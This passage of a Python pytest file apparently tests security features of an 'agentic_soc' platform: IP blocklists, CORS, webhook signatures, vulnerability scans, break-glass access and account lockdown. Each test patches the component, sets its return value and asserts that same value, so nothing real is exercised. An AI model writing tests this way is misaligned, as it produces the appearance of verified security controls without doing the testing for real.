            assert result["rollback_available"] is True

    @pytest.mark.asyncio
    async def test_environment_variable_protection(self):
        """Test protection of sensitive environment variables."""
        with patch("agentic_soc.security.EnvProtection") as mock_env:
            mock_instance = MagicMock()
            mock_env.return_value = mock_instance

            mock_instance.scan_environment.return_value = {
                "scan_status": "completed",
                "sensitive_vars_found": ["DATABASE_PASSWORD", "API_SECRET"],
                "recommendations": [
                    {"var": "DATABASE_PASSWORD", "action": "move_to_vault"},
                    {"var": "API_SECRET", "action": "move_to_vault"}
                ],
                "compliant": False,
                "issues": 2
            }

            result = mock_instance.scan_environment()
            assert result["compliant"] is False
            assert len(result["sensitive_vars_found"]) == 2


class TestNetworkSecurity:
    """Tests for network security controls."""

    @pytest.mark.asyncio
    async def test_ip_allowlist_validation(self):
        """Test IP allowlist/blocklist validation."""
        with patch("agentic_soc.security.IPFilter") as mock_filter:
            mock_instance = MagicMock()
            mock_filter.return_value = mock_instance

            mock_instance.check_ip.return_value = {
                "ip": "192.168.1.100",
                "allowed": True,
                "matched_rule": "internal_network",
                "rule_type": "allowlist",
                "cidr": "192.168.0.0/16"
            }

            result = mock_instance.check_ip("192.168.1.100")
            assert result["allowed"] is True

    @pytest.mark.asyncio
    async def test_blocked_ip_rejection(self):
        """Test blocked IP rejection."""
        with patch("agentic_soc.security.IPFilter") as mock_filter:
            mock_instance = MagicMock()
            mock_filter.return_value = mock_instance

            mock_instance.check_ip.return_value = {
                "ip": "185.220.101.1",
                "allowed": False,
                "matched_rule": "tor_exit_nodes",
                "rule_type": "blocklist",
                "threat_category": "anonymous_proxy",
                "reputation_score": 10
            }

            result = mock_instance.check_ip("185.220.101.1")
            assert result["allowed"] is False
            assert result["threat_category"] == "anonymous_proxy"

    @pytest.mark.asyncio
    async def test_cors_policy_validation(self):
        """Test CORS policy validation."""
        with patch("agentic_soc.security.CORSValidator") as mock_cors:
            mock_instance = MagicMock()
            mock_cors.return_value = mock_instance

            mock_instance.validate_origin.return_value = {
                "origin": "https://dashboard.company.com",
                "allowed": True,
                "matched_pattern": "*.company.com",
                "allowed_methods": ["GET", "POST", "PUT", "DELETE"],
                "allowed_headers": ["Authorization", "Content-Type"],
                "credentials_allowed": True,
                "max_age": 86400
            }

            result = mock_instance.validate_origin("https://dashboard.company.com")
            assert result["allowed"] is True

    @pytest.mark.asyncio
    async def test_request_signing_verification(self):
        """Test webhook request signature verification."""
        with patch("agentic_soc.security.SignatureVerifier") as mock_sig:
            mock_instance = MagicMock()
            mock_sig.return_value = mock_instance

            mock_instance.verify.return_value = {
                "valid": True,
                "signature_header": "sha256=abc123...",
                "algorithm": "HMAC-SHA256",
                "timestamp_valid": True,
                "replay_attack_check": "passed"
            }

            result = mock_instance.verify(
                payload=b'{"event": "alert"}',
                signature="sha256=abc123...",
                timestamp=datetime.utcnow().isoformat()
            )

            assert result["valid"] is True
            assert result["replay_attack_check"] == "passed"


class TestVulnerabilityManagement:
    """Tests for vulnerability management and scanning."""

    @pytest.mark.asyncio
    async def test_dependency_vulnerability_scan(self):
        """Test dependency vulnerability scanning."""
        with patch("agentic_soc.security.DependencyScanner") as mock_scanner:
            mock_instance = MagicMock()
            mock_scanner.return_value = mock_instance

            mock_instance.scan.return_value = {
                "scan_id": "SCAN-001",
                "total_dependencies": 150,
                "vulnerabilities_found": 3,
                "critical": 0,
                "high": 1,
                "medium": 2,
                "low": 0,
                "findings": [
                    {
                        "package": "requests",
                        "version": "2.25.0",
                        "vulnerability": "CVE-2023-32681",
                        "severity": "high",
                        "fixed_version": "2.31.0"
                    }
                ],
                "remediation_available": True
            }

            result = mock_instance.scan()
            assert result["vulnerabilities_found"] == 3
            assert result["critical"] == 0

    @pytest.mark.asyncio
    async def test_container_security_scan(self):
        """Test container image security scanning."""
        with patch("agentic_soc.security.ContainerScanner") as mock_scanner:
            mock_instance = MagicMock()
            mock_scanner.return_value = mock_instance

            mock_instance.scan_image.return_value = {
                "image": "agentic-soc:latest",
                "digest": "sha256:abc123...",
                "vulnerabilities": {
                    "critical": 0,
                    "high": 2,
                    "medium": 5,
                    "low": 10
                },
                "base_image": "python:3.11-slim",
                "secrets_detected": False,
                "compliance": {
                    "cis_benchmark": "passed",
                    "no_root_user": True,
                    "minimal_packages": True
                }
            }

            result = mock_instance.scan_image("agentic-soc:latest")
            assert result["secrets_detected"] is False
            assert result["compliance"]["no_root_user"] is True


class TestIncidentResponseSecurity:
    """Tests for security incident response capabilities."""

    @pytest.mark.asyncio
    async def test_emergency_access_grant(self):
        """Test emergency access (break-glass) procedures."""
        with patch("agentic_soc.security.EmergencyAccess") as mock_emergency:
            mock_instance = MagicMock()
            mock_emergency.return_value = mock_instance

            mock_instance.grant_emergency_access.return_value = {
                "access_id": "EMERG-001",
                "user_id": "user-123",
                "justification": "Critical incident response - ransomware",
                "incident_id": "INC-2024-001",
                "elevated_permissions": ["admin:*", "system:*"],
                "duration": 3600,
                "expires_at": (datetime.utcnow() + timedelta(hours=1)).isoformat(),
                "auto_revoke": True,
                "audit_level": "full",
                "approval_chain": ["ciso@company.com", "cto@company.com"]
            }

            result = mock_instance.grant_emergency_access(
                user_id="user-123",
                justification="Critical incident response - ransomware",
                incident_id="INC-2024-001"
            )

            assert result["auto_revoke"] is True
            assert result["audit_level"] == "full"

    @pytest.mark.asyncio
    async def test_account_lockdown(self):
        """Test emergency account lockdown capabilities."""
        with patch("agentic_soc.security.AccountManager") as mock_account:
            mock_instance = MagicMock()
            mock_account.return_value = mock_instance

            mock_instance.lockdown_account.return_value = {
                "user_id": "compromised-user",
                "lockdown_status": "completed",
                "actions_taken": [
                    "sessions_terminated",
                    "tokens_revoked",
                    "password_reset_required",
                    "mfa_reset_required",
                    "api_keys_disabled"
                ],
                "sessions_killed": 5,
                "tokens_revoked": 12,
                "notification_sent": True,
                "incident_created": "INC-2024-002"
            }

            result = mock_instance.lockdown_account("compromised-user")
            assert result["lockdown_status"] == "completed"
            assert "sessions_terminated" in result["actions_taken"]

    @pytest.mark.asyncio
    async def test_forensic_data_preservation(self):
        """Test forensic data preservation for investigations."""
        with patch("agentic_soc.security.ForensicPreservation") as mock_forensic:
            mock_instance = MagicMock()
            mock_forensic.return_value = mock_instance

            mock_instance.preserve_data.return_value = {
                "preservation_id": "PRESERVE-001",
                "incident_id": "INC-2024-001",
                "data_types_preserved": [
                    "audit_logs",
                    "network_flows",
                    "endpoint_telemetry",
                    "email_headers",
                    "authentication_events"
                ],
                "time_range": {
                    "start": (datetime.utcnow() - timedelta(days=30)).isoformat(),
                    "end": datetime.utcnow().isoformat()
                },
                "storage_location": "s3://forensic-evidence/INC-2024-001/",
                "chain_of_custody": {
                    "custodian": "forensics@company.com",
                    "hash_verification": "sha256:xyz789..."
                },
                "legal_hold": True
            }

            result = mock_instance.preserve_data("INC-2024-001")
            assert result["legal_hold"] is True
            assert "chain_of_custody" in result
